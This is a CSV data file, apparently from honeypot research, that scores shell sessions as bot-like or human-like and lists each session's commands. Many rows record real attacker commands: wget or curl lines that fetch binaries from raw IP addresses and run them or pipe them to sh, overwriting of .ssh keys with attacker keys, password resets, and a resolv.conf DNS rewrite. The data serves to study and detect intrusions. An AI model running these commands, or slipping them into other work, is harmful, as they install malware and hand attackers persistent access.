session,combo_key,label_pdf_quantile,label_tailtest,label_posterior,p_human_tail,p_human_posterior,n_pairs,n_commands,first_cmd,last_cmd,top_commands,logp_human_global
1da09ec271ab,False_False_False,non_human_like,non_human_like,bot_posterior_high,7.017542161813495e-07,3.338525537676069e-10,5,7,ifconfig,echo Hi | cat -n,ifconfig | uname -a | cat /proc/cpuinfo | ps | grep '[Mm]iner' | ps -ef | grep '[Mm]iner' | ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect... | echo Hi | cat -n,-17.39079007726285
87478fda1ff1,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,1.7997396441231073e-80,7,9,>/home/.z && cd /home/; rm -rf .i; cp /bin/echo .i; >.i; chmod 777 .i;,wget http://194.31.98.244/ssh/new/x86 -O-> .i; ./.i scan.x86; >.i;,>/home/.z && cd /home/; rm -rf .i; cp /bin/echo .i; >.i; chmod 777 .i; | >/.z && cd /; rm -rf .i; cp /bin/echo .i; >.i; chmod 777 .i; | >/tmp/.z && cd /tmp/; rm -rf .i; cp /bin/echo .i; >.i; chmod 777 .i; | >/var/tmp/.z && cd /var/tmp/; rm -rf .i; cp /bin/echo .i; >.i; chmod 777 .i; | >/dev/netslink/.z && cd /dev/netslink/; rm -rf .i; cp /bin/echo .i; >.i; chmod 777 .i; | >/dev/.z && cd /dev/; rm -rf .i; cp /bin/echo .i; >.i; chmod 777 .i; | >/var/.z && cd /var/; rm -rf .i; cp /bin/echo .i; >.i; chmod 777 .i; | >/etc/.z && cd /etc/; rm -rf .i; cp /bin/echo .i; >.i; chmod 777 .i;,-186.4682748799693
d24df53ace96,False_False_False,non_human_like,non_human_like,bot_posterior_high,9.314815585526047e-11,2.563587742031828e-16,6,7,ifconfig,echo Hi | cat -n,ifconfig | uname -a | cat /proc/cpuinfo | ps | grep '[Mm]iner' | ps -ef | grep '[Mm]iner' | ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect... | echo Hi | cat -n,-26.73486173172089
234a21040335,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,6.165291497977299e-55,3,5,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | echo 'nameserver 95.214.27.202'>/etc/resolv.conf; | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-119.95144296104506
49724f8f5eec,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,7.008680212923032e-41,3,4,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-79.18421985524202
467795045ede,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,4.642359845567113e-43,4,6,sh,wget http://2.58.149.116/w -O- | sh; curl http://2.58.149.116/c -O- | sh,sh | enable | shell | debug shell | cmd | wget http://2.58.149.116/w -O- | sh; curl http://2.58.149.116/c -O- | sh,-92.33159981747116
08161d5b2282,False_False_False,non_human_like,non_human_like,bot_posterior_high,3.6926017799032707e-13,1.6630663042935199e-18,6,7,ifconfig,echo Hi | cat -n,ifconfig | uname -a | cat /proc/cpuinfo | ps | grep '[Mm]iner' | ps -ef | grep '[Mm]iner' | ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect... | echo Hi | cat -n,-32.45497123828289
6fba76f241a5,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,2.711077765900687e-54,3,4,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-109.80599914865104
8d4bc1169d9e,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,1.5591339079514469e-63,10,12,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC/yU0iqklqw6etPlUon4mZzxslFWq8G8sRyluQM...",wget http://109.206.243.207/ssh/x86_64 -O-> .i; ./.i scan.ssh.x86_64; >.i;,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC/yU0iqklqw6etPlUon4mZzxslFWq8G8sRyluQM... | cp /bin/echo /home/.z && >/home/.z && cd /home/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /.z && >/.z && cd /; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /tmp/.z && >/tmp/.z && cd /tmp/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /var/tmp/.z && >/var/tmp/.z && cd /var/tmp/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /dev/netslink/.z && >/dev/netslink/.z && cd /dev/netslink/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; ch... | cp /bin/echo /dev/.z && >/dev/.z && cd /dev/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /var/.z && >/var/.z && cd /var/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d;",-143.48631397582557
9f8c23a5145e,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,2.411689175791459e-72,8,11,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC/yU0iqklqw6etPlUon4mZzxslFWq8G8sRyluQM...",wget http://109.206.243.207/ssh/x86_64 -O-> .i || busybox wget http://109.206.243.207/ssh/x86_64 -O-> .i || wd1 http://1...,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC/yU0iqklqw6etPlUon4mZzxslFWq8G8sRyluQM... | cp /bin/echo /home/.z && >/home/.z && cd /home/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /tmp/.z && >/tmp/.z && cd /tmp/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /var/tmp/.z && >/var/tmp/.z && cd /var/tmp/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /home/$USER/.z && >/home/$USER/.z && cd /home/$USER/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 77... | cp /bin/echo /dev/.z && >/dev/.z && cd /dev/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /var/.z && >/var/.z && cd /var/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /etc/.z && >/etc/.z && cd /etc/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d;",-157.28858254371357
31e87a3149c1,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,3.759532127720498e-46,3,4,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-100.05977153658648
f9e04f766ca6,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,1.5069203996760258e-53,3,4,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-107.923532963606
38c00655cdc3,False_False_False,non_human_like,non_human_like,bot_posterior_high,1.207201005826164e-11,3.438746176610293e-17,6,7,ifconfig,echo Hi | cat -n,ifconfig | uname -a | cat /proc/cpuinfo | ps | grep '[Mm]iner' | ps -ef | grep '[Mm]iner' | ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect... | echo Hi | cat -n,-28.852592470022486
bcb0631ee81e,False_False_False,non_human_like,non_human_like,bot_posterior_high,7.438494264988549e-15,1.0981543816155858e-17,3,5,echo -e '\x79\x65\x73\x68\x65\x6c\x6f',cd //; wget http://2.58.149.116/x86_64 -O- > .f; ./.f s.x86_64; >.f; echo test,echo -e '\x79\x65\x73\x68\x65\x6c\x6f' | cat /bin/echo | cat /proc/mounts | cp /bin/echo //.f && >//.f && echo -e '\x67\x6f\x6f\x64\x77\x72\x69\x74\x65' && chmod 777 //.f; echo -e '\x63\x6d\x64\x6... | cd //; wget http://2.58.149.116/x86_64 -O- > .f; ./.f s.x86_64; >.f; echo test,-36.47129492293255
4f5e2df8fe91,False_False_False,non_human_like,non_human_like,bot_posterior_high,1.1102230246251563e-16,2.315253658539534e-19,5,7,ifconfig,echo Hi | cat -n,ifconfig | uname -a | cat /proc/cpuinfo | ps | grep '[Mm]iner' | ps -ef | grep '[Mm]iner' | ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect... | echo Hi | cat -n,-40.94903975234283
22d0f64fdf1d,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,4.306824858330475e-40,3,4,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-77.73107196876569
6d06b5672cf7,True_True_True,human_like,human_like,human_posterior_high,0.7524983026895924,0.9938292034886744,3,4,lscpu,apt update,lscpu | (wget -4 ti.4it.top/setup.sh -O setup.sh || curl -o setup.sh ti.4it.top/setup.sh) && bash setup.sh c0c5372c-202f-4e22-a4... | sudo su | apt update,-1.2816911421272803
3e28820470b7,True_True_True,human_like,human_like,human_posterior_high,0.4645681544100098,0.9311469954664446,12,13,w,ls,w | cat /proc/cpuinfo | w | cat /etc/passwd | ps x | ls -a | cd | cd ..,-2.121398543206513
d19eaa9436bb,True_True_True,human_like,human_like,human_posterior_high,0.4188282852938935,0.9482561783060576,10,11,ifconfig -a,ls -l,ifconfig -a | cat /etc/nas3 | cat /etc/hostname | /usr/bin/yes | 18.157.182.239 | ls /usr/bin | /usr/bin/vmstat | vmstat,-2.280384876264654
ebb026ea146d,True_True_True,human_like,human_like,human_posterior_high,0.5346984175986607,0.9756807697566204,4,5,w,w,w | uname -a | cat /proc/cpuinfo | passwd | w,-1.8971414168661012
51fa2a357e92,True_True_True,human_like,human_like,human_posterior_high,0.1506019688767184,0.9675237418896108,5,6,w,w,w | uname -a | ls | cat /proc/cpuinfo | passwd | w,-3.694457624075467
3fe70d416804,True_True_True,human_like,human_like,human_posterior_high,0.127335213112026,0.9085202957183436,5,6,w,uname -a,w | ls | cat /proc/cpuinfo | nproc | passwd | uname -a,-3.910575505439527
c45d41a91211,True_True_True,human_like,human_like,human_posterior_high,0.6207739209996903,0.9776644166616556,16,19,uptime,cat dscript <<EOF,uptime | uptime | cat /etc/hosts | ls -lrt | which | which uname | hostname | cat /etc/hostname,-1.6443179952777491
605a230627bc,True_True_True,human_like,human_like,human_posterior_high,0.2635423762998395,0.9464574200671356,18,20,unamer -a,cat /etc/poasswd,unamer -a | uname -a | ssh -v | ssh -V | cat /etc/hosts | scp | ls -lrt /usr/bin/ | w,-2.947230588813307
9fb0a0d7ade0,True_True_True,human_like,human_like,human_posterior_high,0.6883674591897915,0.9689089828482784,4,5,w,ps x,w | cat /proc/cpuinfo | passwd | w | ps x,-1.456369726488552
53459e703369,True_True_True,human_like,human_like,human_posterior_high,0.8007595260424095,0.981056274172858,8,9,"echo ""paul cox testing""",exit,"echo ""paul cox testing"" | cat /etc/hostname | echo $hostname | cat hostname | hostname | uname -a | ssh -V | cat etc/hostname",-1.1494964635101352
71d468e1469f,True_True_True,human_like,human_like,human_posterior_high,0.1354458878430435,0.9666143667785396,3,4,ifconfig,echo Hi | cat -n,ifconfig | uname -a | cat /proc/cpuinfo | echo Hi | cat -n,-3.831401157057683
d0325f08b21f,True_True_False,human_like,human_like,ambiguous,0.136019697558238,0.386717427069383,39,42,date,ls -l /usr/bin/yes,date | ls -l /usr | ls -l /usr/bin | file | xstat | cat /usr/bin/yes | /usr/bin/yes | ls /usr/bin,-3.825966306421817
20f796c9376a,True_True_False,human_like,human_like,ambiguous,0.2535903887163198,0.4998452255305152,19,22,touch file,uname -a,touch file | ssh admin@23ouywifuhfsdhf | cd ../admin | cd /home/admin | ls -lrt | ps | ps -eaf | ps -fead,-3.000269766137071
61ebdd0a4b36,True_True_False,human_like,human_like,ambiguous,0.4663607003378535,0.8564496881882021,3,4,ifconfig,echo Hi | cat -n,ifconfig | uname -a | cat /proc/cpuinfo | echo Hi | cat -n,-2.115397423107834
0645694415d2,True_True_False,human_like,human_like,ambiguous,0.1994834286230908,0.3134801327459654,24,26,curl,history -c,curl | uname -a | curl http://xtibh.com/d/EER6Es | sh | ps aux | ps aux | grep curl | ps aux | mount | uname -a,-3.324967438344713
b269844f934b,True_True_False,human_like,human_like,ambiguous,0.5094034777999725,0.8348261254192633,23,25,cat /etc/rsyslog.conf,ls -l /home/phil,cat /etc/rsyslog.conf | cat /etc/login.defs | history | cat /etc/hosts | cat /etc/hosts | cat /etc/hostname | hostname | find /,-1.9757230705617783
2b058889c060,True_True_False,human_like,human_like,ambiguous,0.1982023960354473,0.8128980004177856,21,25,uname- a,ls -l /etc,uname- a | uname -a | pwd | ls /root | ls /home | id | awk | pwd,-3.3335559149502094
d63a514c15d3,True_True_False,human_like,human_like,ambiguous,0.1059735125224123,0.1251968729029376,4,5,ifconfig,echo Hi | cat -n,ifconfig | uname -a | cat /proc/cpuinfo | ps | grep '[Mm]iner' | echo Hi | cat -n,-4.143853077208314
5222b4b0ad7c,True_True_False,human_like,human_like,ambiguous,0.1980106969445543,0.8779895583202485,8,9,cat /proc/net/arp,pwd,cat /proc/net/arp | ls /proc/net | pwd | cd /proc | ls -l | ifconfig -a | uname -a | mount,-3.334845373842534
2d22c276a3f0,True_True_False,human_like,human_like,ambiguous,0.102025461400095,0.3876967692018913,16,18,w,rm -rf .reload,w | wget | nano | nano aa | ls -a | cd /usr | ls -a | wget https://bashupload.com/4vQyv/reload.tgz,-4.191705670985144
ab4a2a5d7d34,True_True_False,human_like,human_like,ambiguous,0.2129778605228414,0.7240563776538276,13,14,w,ls -a,w | cat /pro/cpuinfo | cat /proc/cpuinfo | uname -a | yum install screen | yum install *lib* | yum update | passwd,-3.237350006497413
53c9d44086cc,False_True_False,uncertain,human_like,ambiguous,0.0677980418282099,0.8501555337667817,7,9,free -m,passwd,free -m | passwd | passwd | passwd | help | clear | git clone https://github.com/vanhauser-thc/thc-hydra | git https://github.com/vanhauser-thc/thc-hydra,-4.699728503826556
c691f2aa053d,False_True_False,uncertain,human_like,bot_posterior_high,0.0644107778997671,0.011432162756986,17,19,cd ~; chattr -ia .ssh; lockr -ia .ssh,df -h | head -n 2 | awk 'FNR == 2 {print $2; }',"cd ~; chattr -ia .ssh; lockr -ia .ssh | cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1... | cat /proc/cpuinfo | grep name | wc -l | echo -e ""admin\ngyymh62hAS8k\ngyymh62hAS8k"" | passwd | bash | echo ""admin\ngyymh62hAS8k\ngyymh62hAS8k\n"" | passwd | cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9; }' | free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}' | ls -lh $(which ls)",-4.762618773680036
1ca21cbba327,False_True_False,uncertain,human_like,ambiguous,0.0662890294810069,0.5523357127125688,9,11,ls -l,ls -lrt,"ls -l | wget ipinfo.io/ip | cat ip | ls -lrt | ls -l | uname | echo ""."" | while",-4.72736900577097
930021e821f1,False_True_False,uncertain,human_like,bot_posterior_high,0.0503107034004133,0.0962423086689286,4,5,ifconfig,echo Hi | cat -n,ifconfig | uname -a | ps | grep '[Mm]iner' | ps -ef | grep '[Mm]iner' | echo Hi | cat -n,-5.063572466417354
888de80e3b84,False_False_True,non_human_like,non_human_like,human_posterior_high,0.0,0.9003953035378822,3,4,id;,help; ?; ; ;,id; | help; ?; ; ; | id; | help; ?; ; ;,-48.222220720032915
cf03edfdfe14,False_False_True,uncertain,non_human_like,human_posterior_high,0.0028563517647601,0.999144530805966,8,9,ls -rlt,nc -vv 107.23.254.247.214 80,ls -rlt | ls -lrt | ls -lrta | touch file | ls -lrt | curl https://www.viessmann.co.uk | nc | nc -vv 208,-8.389546808036252
4f9734961cec,False_False_True,non_human_like,non_human_like,human_posterior_high,2.112754415861673e-12,0.9901442502510416,3,4,ifconfig,echo Hi | cat -n,ifconfig | uname -a | ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect... | echo Hi | cat -n,-30.65473963644871
8c71dc7bc3e8,False_False_True,non_human_like,non_human_like,human_posterior_high,0.0,0.904839786666386,3,4,id;,help; ?; ; ;,id; | help; ?; ; ; | id; | help; ?; ; ;,-46.16802167746739
b8c285cdc6f4,False_True_True,uncertain,human_like,human_posterior_high,0.0643256336656106,0.9907700344083564,3,4,"echo ""paul coxtesting",exit,"echo ""paul coxtesting | echo ""paul cox txtesting"" | cat /etc/hostname | exit",-4.764239717117175
2a67d5b15812,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,3.814937105297372e-52,3,5,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | echo 'nameserver 95.214.27.202'>/etc/resolv.conf; | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-114.998583836452
792ba473c8a8,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,1.5773239532899082e-45,4,6,cat /bin/echo,wget --help>/dev/null && echo -en '\x57\x47\x45\x54'; curl --help>/dev/null && echo -en '\x43\x55\x52\x4c'; echo -en '\x...,cat /bin/echo | cat /proc/mounts | echo -e '\x72\x70\x70\x72/dev' > /dev/.dabag; cat /dev/.dabag; rm /dev/.dabag | echo -e '\x4d\x4f\x55\x4e\x54\x53\x5f\x44\x4f\x4e\x45' | rm -f /dev/.d; rm -f /dev/.f; >/dev/.d; (chmod 777 /dev/.d || cp /bin/echo /dev/.d; >/dev/.d); cp /dev/.d /dev/.f | wget --help>/dev/null && echo -en '\x57\x47\x45\x54'; curl --help>/dev/null && echo -en '\x43\x55\x52\x4c'; echo -en '\x...,-101.09858577719532
dca985845b3c,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,2.493451409398148e-77,9,11,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC/yU0iqklqw6etPlUon4mZzxslFWq8G8sRyluQM...",wget http://109.206.243.207/ssh/x86_64 -O-> .i || busybox wget http://109.206.243.207/ssh/x86_64 -O-> .i || wd1 http://1...,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC/yU0iqklqw6etPlUon4mZzxslFWq8G8sRyluQM... | cp /bin/echo /home/.z && >/home/.z && cd /home/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /tmp/.z && >/tmp/.z && cd /tmp/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /var/tmp/.z && >/var/tmp/.z && cd /var/tmp/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /home/$USER/.z && >/home/$USER/.z && cd /home/$USER/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 77... | cp /bin/echo /dev/.z && >/dev/.z && cd /dev/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /var/.z && >/var/.z && cd /var/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /etc/.z && >/etc/.z && cd /etc/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d;",-168.44790969956435
1f49885f065e,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,2.9432162718199156e-72,11,15,sh,wget http://95.214.27.202/x86_64 -O-> .i || busybox wget http://95.214.27.202/x86_64 -O-> .i || wd1 http://95.214.27.202...,"sh | shell | enable | cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC/yU0iqklqw6etPlUon4mZzxslFWq8G8sRyluQM... | mkdir /home/; mount -o remount, rw /home/; cp /bin/echo /home/.z && >/home/.z && cd /home/; rm -rf .i; cp .z .i; cp .i .... | mkdir /tmp/; mount -o remount, rw /tmp/; cp /bin/echo /tmp/.z && >/tmp/.z && cd /tmp/; rm -rf .i; cp .z .i; cp .i .d; ch... | mkdir /var/tmp/; mount -o remount, rw /var/tmp/; cp /bin/echo /var/tmp/.z && >/var/tmp/.z && cd /var/tmp/; rm -rf .i; cp... | mkdir /home/$USER/; mount -o remount, rw /home/$USER/; cp /bin/echo /home/$USER/.z && >/home/$USER/.z && cd /home/$USER/...",-157.08530152585706
b60637083cd8,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,2.644708451505576e-41,3,4,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-80.24265316797512
15b67af6983f,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,1.3321595189503461e-51,3,4,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-103.22739080932328
40a1a9eeba1e,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,2.173584399235164e-34,3,4,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-66.01926405565816
a0e251db304f,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,6.654203589469242e-36,3,4,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-68.29275782035643
a4b5b82673c0,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,7.978818884416794e-22,6,7,ifconfig,echo Hi | cat -n,ifconfig | uname -a | cat /proc/cpuinfo | ps | grep '[Mm]iner' | ps -ef | grep '[Mm]iner' | ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect... | echo Hi | cat -n,-42.53809132814292
6cf11c78d01f,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,2.813928223033187e-47,3,4,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-94.5060553192065
a2271aa921be,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,1.3391065865008029e-52,3,5,echo 1 > /dev/null && cat /bin/echo,>A@/1'8ELF7},"echo 1 > /dev/null && cat /bin/echo | nohup $SHELL -c ""curl http://47.239.42.214:60123/linux -o /tmp/nEpLjNjJ9s; if [ ! -f /tmp/nEpLjNjJ9s ]; then wget http:/... | head -c 3800636 > /tmp/CTPl7hzWFZ | nohup $SHELL -c ""curl http://47.239.42.214:60123/linux -o /tmp/nEpLjNjJ9s; if [ ! -f /tmp/nEpLjNjJ9s ]; then wget http:/... | >A@/1'8ELF7}",-118.53410381046947
